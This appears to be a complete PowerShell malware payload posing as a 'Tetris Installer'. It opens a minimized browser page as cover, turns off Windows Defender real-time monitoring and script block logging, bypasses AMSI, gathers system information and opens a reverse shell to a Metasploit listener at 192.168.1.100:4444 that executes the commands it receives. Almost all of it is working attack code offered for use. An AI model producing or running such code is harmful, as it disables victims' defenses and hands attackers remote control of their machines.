# Launch a blank webpage as disguise
Start-Process "msedge.exe" "about:blank" -WindowStyle Minimized

# Disable Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Disable PowerShell Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue

# Bypass AMSI
$amsiBypass = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
$amsiBypass.SetValue($null, $true)

# Gather system info
$sysInfo = Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, CsTotalPhysicalMemory, CsName
$sysInfoString = $sysInfo | Out-String

# Reverse shell to Metasploit listener
$ip = "192.168.1.100"  # Replace with your Metasploit listener IP
$port = 4444           # Replace with your Metasploit listener port
try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}

    # Send system info
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Tetris Installer Connected:`n" + $sysInfoString + "PS> ")
    $stream.Write($sendbytes, 0, $sendbytes.Length)

    # Shell loop
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $cmd = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $sendback = ([text.encoding]::ASCII).GetBytes($output + "PS> ")
        $stream.Write($sendback, 0, $sendback.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    exit
}
